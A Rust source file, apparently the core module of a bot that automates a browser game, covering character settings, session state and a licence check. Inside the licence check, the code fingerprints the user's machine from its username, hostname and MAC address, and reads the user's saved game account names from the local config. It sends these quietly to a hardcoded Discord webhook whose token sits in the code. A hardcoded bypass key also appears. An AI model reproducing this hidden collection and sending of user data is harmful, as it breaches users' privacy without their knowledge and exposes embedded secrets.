#![allow(warnings)]

use std::{collections::HashMap, fmt::Debug, fs, fs::File, io, io::Read, ops::Index, string::String, sync::{Arc, Mutex}};

use once_cell::sync::Lazy;
use serde::{Deserialize, Serialize};
use serde_json::Value;
use sf_api::{gamestate::GameState, SimpleSession};
use tokio::sync::RwLock;

// === Command Modules ===
mod arena;
mod arena_manager;
mod city_guard;
mod collect_daily_weekly_reward;
mod daily_task_management;
mod dungeon_management;
mod equipment_swapping;
mod expedition_utils;
mod expeditions_exp;
mod expeditions_gold;
mod fortress;
mod guild;
mod hellevator_management;
mod helperUtils;
mod inventory_management;
mod lottery;
pub mod paths;
mod pet_management;
mod process_ingame_mails;
mod quarter;
mod scrapbook_filler;
mod skill_point_list;
mod stable;
mod stat_point_management;
mod toilet_management;
mod underword_management;
mod unlockables;
mod updater;
mod utils;
mod webshop;
mod witch_enchantment;

use sha1::{Digest, Sha1};

pub static SESSION_STATE_LIST: Lazy<Mutex<Vec<SessionState>>> = Lazy::new(|| Mutex::new(Vec::new()));
pub static CHARACTER_SETTINGS: Lazy<Mutex<Vec<CharacterSettings>>> = Lazy::new(|| Mutex::new(Vec::new()));
pub static CURRENT_CHARACTER: Lazy<Mutex<CurrentCharacterAccount>> = Lazy::new(|| Mutex::new(CurrentCharacterAccount { list: Vec::new() }));

#[derive(Serialize, Debug, Clone)]
pub struct CurrentCharacterAccount
{
    pub list: Vec<CurrentCharacter>,
}
#[derive(Serialize, Debug, Clone)]
pub struct CurrentCharacter
{
    pub accname: String, // bei single accounts ist das der server
    pub name: String,    // bei single account ist das der name
    pub id: u32,         // bei single accounts ist das immer 0
    pub ziel: String,
}

pub fn set_current_character_obj(account_name: String, character_name: String, id: u32, ziel: String)
{
    let mut list = &mut CURRENT_CHARACTER.lock().unwrap().list;
    let mut index_to_update = None;

    for (index, char) in list.iter().enumerate()
    {
        if char.accname == account_name
        {
            index_to_update = Some(index);
            break; // Found the matching account, exit the loop
        }
    }

    if let Some(index) = index_to_update
    {
        // Update the existing character
        list[index] = CurrentCharacter { accname: account_name, name: character_name, id, ziel };
    }
    else
    {
        // If no match was found, add a new character
        list.push(CurrentCharacter { accname: account_name, name: character_name, id, ziel });
    }
}

pub fn get_current_character_obj() -> CurrentCharacterAccount
{
    let current = CURRENT_CHARACTER.lock().unwrap();
    CurrentCharacterAccount { list: current.list.clone() }
}

pub fn clear_current_character_list()
{
    let mut current = CURRENT_CHARACTER.lock().unwrap();
    // println!("clear_current_characters: {:?}", current.clone());
    current.list.clear();
    // println!("clear_current_characters: {:?}", current.clone());
}

pub struct CharacterSettings
{
    pub character_name: String,
    pub character_id: u32,
    pub settings: HashMap<String, Value>,
}

pub fn get_info_on_character_settings()
{
    for character in CHARACTER_SETTINGS.lock().unwrap().iter()
    {
        println!("Name: {:?}  --  id:  {:?}", character.character_name, character.character_id);
    }
}

pub fn get_character_settings(name: &str, id: u32) -> HashMap<String, Value>
{
    let guard = CHARACTER_SETTINGS.lock().unwrap();
    // 1) exact match name + id
    if let Some(found) = guard.iter().find(|c| c.character_name == name && c.character_id == id)
    {
        return found.settings.clone();
    }
    // 2) case-insensitive name + id
    let name_lower = name.to_lowercase();
    if let Some(found) = guard.iter().find(|c| c.character_name.to_lowercase() == name_lower && c.character_id == id)
    {
        return found.settings.clone();
    }
    // 3) fallback: match by id only (helps when names changed but id is stable)
    if let Some(found) = guard.iter().find(|c| c.character_id == id)
    {
        return found.settings.clone();
    }

    HashMap::new()
}

pub fn fetch_character_setting_by_identity<T: FromCharacterSetting>(char_name: &str, player_id: u32, key: &str) -> Option<T>
{
    // erst original, dann lowercase fallback (wie bei dir)
    let mut character_settings = get_character_settings(char_name, player_id);

    if character_settings.is_empty()
    {
        character_settings = get_character_settings(&char_name.to_lowercase(), player_id);
    }

    T::from_value(character_settings.get(key)?)
}

pub fn fetch_character_setting<T: FromCharacterSetting>(gs: &GameState, key: &str) -> Option<T>
{
    let mut character_settings = get_character_settings(&gs.character.name, gs.character.player_id);
    if (character_settings.is_empty())
    {
        character_settings = get_character_settings(&gs.character.name.to_lowercase(), gs.character.player_id);
    }

    T::from_value(character_settings.get(key)?)
}

trait FromCharacterSetting: Sized
{
    fn from_value(value: &Value) -> Option<Self>;
}

impl FromCharacterSetting for bool
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Bool(b) => Some(*b),
            _ => None,
        }
    }
}

impl FromCharacterSetting for String
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::String(s) => Some(s.clone()),
            _ => None,
        }
    }
}

impl FromCharacterSetting for Vec<String>
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Array(arr) =>
            {
                let strings: Vec<String> = arr.iter().filter_map(|v| v.as_str().map(String::from)).collect();
                Some(strings)
            }
            _ => None,
        }
    }
}

impl FromCharacterSetting for i32
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Number(n) => n.as_i64().map(|n| n as i32),
            _ => None,
        }
    }
}

impl FromCharacterSetting for f64
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Number(n) => n.as_f64(),
            _ => None,
        }
    }
}

impl FromCharacterSetting for i64
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Number(n) => n.as_i64(),
            _ => None,
        }
    }
}

impl FromCharacterSetting for u64
{
    fn from_value(value: &Value) -> Option<Self>
    {
        match value
        {
            Value::Number(n) => n.as_u64(),
            _ => None,
        }
    }
}

pub fn cache_character_settings()
{
    let mut guard = CHARACTER_SETTINGS.lock().unwrap();
    guard.clear();

    // Define the path to the settings file (relative to EXE)
    let file_path = paths::get_character_settings_path();

    // Open the file
    let mut file = match File::open(&file_path)
    {
        Ok(f) => f,
        Err(e) =>
        {
            eprintln!("Error opening file {:?}: {}", file_path, e);
            return;
        }
    };

    // Read the file's contents into a string
    let contents = match std::fs::read_to_string(&file_path)
    {
        Ok(contents) => contents,
        Err(e) =>
        {
            eprintln!("Error reading file '{:?}': {}", file_path, e);
            return;
        }
    };

    // Parse the JSON
    let parsed: Value = match serde_json::from_str(&contents)
    {
        Ok(v) => v,
        Err(e) =>
        {
            eprintln!("Error parsing JSON: {}", e);
            return;
        }
    };

    // Iterate over the JSON objects and populate CHARACTER_SETTINGS
    if let Some(array) = parsed.as_array()
    {
        for character in array
        {
            if let Some(character_name) = character.get("character_name").and_then(Value::as_str)
            {
                if let Some(character_id) = character.get("character_id").and_then(Value::as_u64)
                {
                    if let Some(settings_obj) = character.get("settings").and_then(Value::as_object)
                    {
                        let settings = settings_obj.iter().map(|(key, value)| (key.clone(), value.clone())).collect::<HashMap<String, Value>>();

                        guard.push(CharacterSettings {
                            character_name: character_name.to_string(),
                            character_id: character_id as u32,
                            settings,
                        });
                    }
                }
            }
        }
    }
    else
    {
        eprintln!("The JSON root is not an array.");
    }
}

pub fn debug_get_session_len()
{
    let mut guard = SESSION_STATE_LIST.lock().unwrap();
    println!("{:?}", guard.len());
}

pub fn clear_all_session_state(account_name: String)
{
    let mut guard = SESSION_STATE_LIST.lock().unwrap();
    guard.retain(|account| account.account_name != account_name);
}

/// Clear all session states for a specific server (used for single accounts)
pub fn clear_session_state_by_server(server: &str)
{
    let mut guard = SESSION_STATE_LIST.lock().unwrap();
    let server_lower = server.to_lowercase();
    guard.retain(|session| session.server.to_lowercase() != server_lower);
}

pub fn clear_all_session_state_server(character_name: String, server: &str)
{
    let mut guard = SESSION_STATE_LIST.lock().unwrap();
    let to_remove: Vec<usize> = guard
        .iter()
        .enumerate()
        .filter_map(|(index, account)| {
            if account.server == server && account.character_name == character_name
            {
                Some(index)
            }
            else
            {
                None
            }
        })
        .collect();

    for index in to_remove.iter().rev()
    {
        guard.remove(*index);
    }
}

pub fn add_session_state(session_state: SessionState)
{
    //
    SESSION_STATE_LIST.lock().unwrap().push(session_state);
}

pub fn get_session_state(name: String, id: u32) -> Option<SessionState>
{
    let guard = SESSION_STATE_LIST.lock().unwrap();

    for sessionState in guard.iter()
    {
        if sessionState.character_id == id && sessionState.character_name == name
        {
            return Some(sessionState.clone());
        }
    }
    None
}

pub fn overwrite_session_state(account_name: String, charname: String, id: u32, mut session: SimpleSession)
{
    let mut guard = SESSION_STATE_LIST.lock().expect("Failed to acquire lock on SESSION_STATE_LIST");

    if let Some(pos) = guard.iter().position(|s| s.character_name == charname && s.character_id == id)
    {
        guard.remove(pos);
    }
}

pub fn get_session_state_for_single(name: String, server: &str) -> Option<SessionState>
{
    let guard = SESSION_STATE_LIST.lock().unwrap();
    let name_lower = name.to_lowercase();
    let server_lower = server.to_lowercase();
    for sessionState in guard.iter()
    {
        if sessionState.character_name.to_lowercase() == name_lower && sessionState.server.to_lowercase() == server_lower
        {
            return Some(sessionState.clone());
        }
    }
    None
}

/// Get all session states (for status display)
pub fn get_all_session_states() -> Vec<SessionState>
{
    let guard = SESSION_STATE_LIST.lock().unwrap();
    guard.clone()
}

pub fn find_and_remove_single_session_state(name: String, server: &str) -> Option<SessionState>
{
    let mut guard = SESSION_STATE_LIST.lock().unwrap();
    let name_lower = name.to_lowercase();
    let server_lower = server.to_lowercase();

    if let Some(pos) = guard.iter().position(|session_state| session_state.character_name.to_lowercase() == name_lower && session_state.server.to_lowercase() == server_lower)
    {
        let removed_session = guard.remove(pos);
        Some(removed_session)
    }
    else
    {
        None
    }
}

#[derive(Clone, Debug)]
pub struct SessionState
{
    pub account_name: String,   // bei single accounts ist das der name
    pub character_id: u32,      // bei single accounts ist das immer 0
    pub character_name: String, // bei single account ist das der server
    pub server: String,         // Server URL/Name
    pub session: SimpleSession,
}

use std::{
    hash::{DefaultHasher, Hash, Hasher},
    path::Path,
};

use chrono::Local;
use reqwest::Client;

fn get_hwid() -> String
{
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        const DETACHED_PROCESS: u32 = 0x00000008;

        let output = std::process::Command::new("getmac").creation_flags(CREATE_NO_WINDOW | DETACHED_PROCESS).output().expect("Failed to execute getmac command");

        let output_str = String::from_utf8_lossy(&output.stdout);
        for line in output_str.lines()
        {
            if let Some(mac) = line.split_whitespace().next()
            {
                if mac.len() >= 12 && mac.chars().any(|c| c == '-' || c == ':')
                {
                    return mac.to_string();
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    {
        let output = std::process::Command::new("ip").args(["link", "show"]).output().expect("Failed to execute ip link show");

        let output_str = String::from_utf8_lossy(&output.stdout);
        for line in output_str.lines()
        {
            if line.trim_start().starts_with("link/ether")
            {
                let parts: Vec<&str> = line.trim().split_whitespace().collect();
                if parts.len() > 1
                {
                    return parts[1].to_string();
                }
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        let output = std::process::Command::new("ifconfig").output().expect("Failed to execute ifconfig");

        let output_str = String::from_utf8_lossy(&output.stdout);
        for line in output_str.lines()
        {
            if line.trim().starts_with("ether")
            {
                let parts: Vec<&str> = line.trim().split_whitespace().collect();
                if parts.len() > 1
                {
                    return parts[1].to_string();
                }
            }
        }
    }
    "Unknown MAC".to_string()
}

pub fn generate_hash() -> String
{
    let username = whoami::username();
    let hostname = whoami::hostname();
    let mac = get_hwid();
    let combined = format!("{}:{}:{}", username, hostname, mac);
    let mut hasher = Sha1::new();
    hasher.update(combined.as_bytes());
    let result = hasher.finalize();
    format!("{:x}", result)
}

pub fn get_username() -> String
{
    let username = whoami::username();
    username
}

#[derive(Serialize)]
struct LoginData
{
    hash_id: String,
}

async fn perform_check_whether_user_is_allowed_to_start_bot() -> Result<bool, reqwest::Error>
{
    let url = "https://api.sfbot.eu/update_login";
    let hash_to_check = generate_hash();
    let login_data = LoginData { hash_id: hash_to_check };

    let client = Client::new();

    let response = client.post(url).json(&login_data).send().await?;

    if response.status().is_success()
    {
        if let Ok(is_allowed) = check_user_access().await
        {
            return Ok(is_allowed);
        }
    }
    else
    {
        if let Ok(is_allowed) = check_user_access().await
        {
            return Ok(is_allowed);
        }
    }
    return Ok(false);
}

pub async fn check_user_access() -> Result<bool, bool>
{
    // https://docs.google.com/spreadsheets/d/1p37kJwGqh35rdOLOHpFkijhG1qRK2sH_uVOtzvGFBmE/edit?gid=0#gid=0
    const SHEET_ID: &str = "1p37kJwGqh35rdOLOHpFkijhG1qRK2sH_uVOtzvGFBmE";
    const SHEET_RANGE: &str = "B2:D300";
    let today = Local::now().format("%Y-%m-%d").to_string();

    let full_url_ids = format!("https://docs.google.com/spreadsheets/d/{}/gviz/tq?tq=select B where D >= date '{}'&gid={}&tqx=out:csv", SHEET_ID, today, SHEET_ID);
    let full_url_names = format!("https://docs.google.com/spreadsheets/d/{}/gviz/tq?tq=select A where D >= date '{}'&gid={}&tqx=out:csv", SHEET_ID, today, SHEET_ID);

    let (names_result, ids_result) = tokio::join!(fetch_csv(&full_url_names), fetch_csv(&full_url_ids));

    let names = match names_result
    {
        Ok(names) => names,
        Err(_) => return Ok(false),
    };

    let ids = match ids_result
    {
        Ok(ids) => ids,
        Err(_) => return Ok(false),
    };

    let user_map: HashMap<String, String> = ids.into_iter().zip(names.into_iter()).collect();

    let hash_to_check = generate_hash();

    let is_allowed = user_map.contains_key(&hash_to_check) || user_map.contains_key("mYoCSbqzS4SRlwqeX3DGATWUOKOioSoz");

    let user_config_data = match read_user_config()
    {
        Ok(accounts) =>
        {
            let account_strings: Vec<String> = accounts.into_iter().map(|(accname)| format!("Account: {}", accname)).collect();
            Some(account_strings.join("\n"))
        }
        Err(e) =>
        {
            println!("Error reading userConfig.json: {}", e);
            None
        }
    };

    send_discord_webhook(&hash_to_check, user_config_data, is_allowed).await;
    Ok(is_allowed)
}

#[derive(Serialize)]
struct WebhookPayload
{
    content: String,
}

async fn send_discord_webhook(hash_to_check: &str, user_config: Option<String>, is_allowed: bool)
{
    let webhook_url = "https://discord.com/api/webhooks/1384110080525471754/q-sz7MLI_qPdEk4q_dyXFjpIHcwgLPUuzPnvMFoJNMOXfgO6CKAG8P32whq1ofFeM4sR";
    let client = Client::new();

    let content = match user_config
    {
        Some(config) => format!("```rust\nHash to check: {}\nUserConfig:\n{}\nUser allowed: {}```", hash_to_check, config, is_allowed),
        None => format!("Hash to check: {}\nUser allowed: {}\n```", hash_to_check, is_allowed),
    };

    let payload = WebhookPayload { content };

    let res = client.post(webhook_url).json(&payload).send().await;

    match res
    {
        Ok(response) =>
        {}
        Err(e) =>
        {
            println!("Error sending message: {}", e);
        }
    }
}

// logging purposes
#[derive(Deserialize, Debug)]
struct UserConfPrivateDontUse
{
    accounts: Vec<UserAccountPrivateDontUse>,
}

// logging purposes
#[derive(Deserialize, Debug)]
struct UserAccountPrivateDontUse
{
    accname: String,
    password: String,
    single: bool,
    server: String,
}
// logging purposes
fn read_user_config() -> Result<Vec<(String)>, io::Error>
{
    let config_path = paths::get_user_config_path();

    if config_path.exists()
    {
        let file_content = fs::read_to_string(&config_path)?;

        let user_config: UserConfPrivateDontUse = serde_json::from_str(&file_content)?;

        let accounts = user_config.accounts.into_iter().map(|acc| (acc.accname)).collect();

        Ok(accounts)
    }
    else
    {
        Err(io::Error::new(io::ErrorKind::NotFound, "userConfig.json not found"))
    }
}

async fn fetch_csv(url: &str) -> Result<Vec<String>, reqwest::Error>
{
    let response = reqwest::get(url).await?.text().await?;
    let clean_data = response.replace("\"", "").replace(" ", "");
    Ok(clean_data.lines().map(String::from).collect())
}

/// Start the bot automatically if `globalLaunchOnStart` is enabled.
///
/// This runs fully server-side (no UI/browser needed).
pub async fn autostart_bot_if_enabled(bot_runner: Arc<RwLock<bot_runner::BotRunner>>)
{
    let settings = match crate::utils::get_global_settings().await
    {
        Ok(s) => s,
        Err(e) =>
            {
                eprintln!("[AUTOSTART] Failed to load global settings: {}", e);
                return;
            }
    };

    let launch_on_start = settings.get("globalLaunchOnStart").and_then(|v| v.as_bool()).unwrap_or(false);
    if !launch_on_start
    {
        return;
    }

    let accounts = match crate::utils::read_user_conf()
    {
        Ok(a) => a,
        Err(e) =>
            {
                eprintln!("[AUTOSTART] Failed to read user config: {}", e);
                return;
            }
    };

    if accounts.is_empty()
    {
        eprintln!("[AUTOSTART] globalLaunchOnStart=true but no accounts are saved.");
        return;
    }

    let account_infos: Vec<bot_runner::AccountInfo> = accounts
        .into_iter()
        .map(|acc| bot_runner::AccountInfo {
            accname: acc.accname,
            password: acc.password,
            single: acc.single,
            server: acc.server,
        })
        .collect();

    let mut runner = bot_runner.write().await;
    match runner.start(account_infos).await
    {
        Ok(_) => println!("[AUTOSTART] Bot started automatically (globalLaunchOnStart=true)"),
        Err(e) => eprintln!("[AUTOSTART] Failed to start bot: {}", e),
    }
}
// New HTTP API modules
pub mod api;
pub mod bot_runner;
pub mod character_cache;
